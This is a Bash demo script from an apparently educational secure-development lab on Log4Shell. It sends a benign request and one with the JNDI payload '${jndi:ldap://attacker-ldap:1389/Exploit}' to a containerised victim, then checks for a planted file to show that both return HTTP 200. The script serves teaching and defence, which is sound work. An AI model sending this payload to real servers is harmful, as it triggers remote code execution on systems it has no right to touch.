#!/usr/bin/env bash
# comparar.sh — demo lado a lado: peticion benigna vs. con payload.
# Las DOS devuelven HTTP 200; solo el payload deja rastro (RCE) en la victima.
# Mensaje: un "200 OK" NO certifica que no pasó nada. Ejecutar desde el host:
#   cd ~/desarrollo-seguro-ucp/seclab/labs/01-log4shell && ./comparar.sh
set -u
B=$'\e[1m'; D=$'\e[2m'; G=$'\e[32m'; R=$'\e[31m'; Y=$'\e[1;33m'; N=$'\e[0m'

docker compose up -d >/dev/null 2>&1
for _ in $(seq 1 15); do docker compose logs victim 2>/dev/null | grep -qiE "listening|8080|servidor|started" && break; sleep 1; done

req() {  # $1=etiqueta  $2=valor-cabecera
  docker compose run --rm trigger -s -o /dev/null -w "%{http_code}" \
    -H "X-Api-Version: $2" http://victim:8080/ 2>/dev/null
}
rastro() { docker compose exec -T victim sh -c 'cat /tmp/pwned.txt 2>/dev/null'; }

printf '%s\n' "${B}=== Log4Shell · misma app, dos peticiones ===${N}"
docker compose exec -T victim sh -c 'rm -f /tmp/pwned.txt'

printf '\n%s\n' "${B}[1] PETICION BENIGNA${N}"
printf '   cabecera : %sX-Api-Version: 2.3.1%s\n' "$D" "$N"
printf '   respuesta: HTTP %s%s%s\n' "$G" "$(req benigna '2.3.1')" "$N"; sleep 1
if [ -z "$(rastro)" ]; then printf '   rastro   : %sNADA — la victima quedo intacta%s\n' "$G" "$N"
else printf '   rastro   : %s%s%s\n' "$R" "$(rastro|head -1)" "$N"; fi

printf '\n%s\n' "${B}[2] PETICION CON PAYLOAD${N}"
printf '   cabecera : %sX-Api-Version: ${jndi:ldap://attacker-ldap:1389/Exploit}%s\n' "$D" "$N"
printf '   respuesta: HTTP %s%s%s\n' "$G" "$(req payload '${jndi:ldap://attacker-ldap:1389/Exploit}')" "$N"; sleep 2
if [ -n "$(rastro)" ]; then
  printf '   rastro   : %sRCE! ejecucion de codigo en la victima:%s\n' "$R" "$N"
  rastro | sed 's/^/             /'
else printf '   rastro   : %s(sin rastro)%s\n' "$Y" "$N"; fi

printf '\n%s\n' "${Y}Las dos dieron HTTP 200. El 200 NO dice si hubo ataque.${N}"
printf '%s\n' "${Y}La verdad esta DENTRO del servidor (archivos, logs), no en la respuesta.${N}"
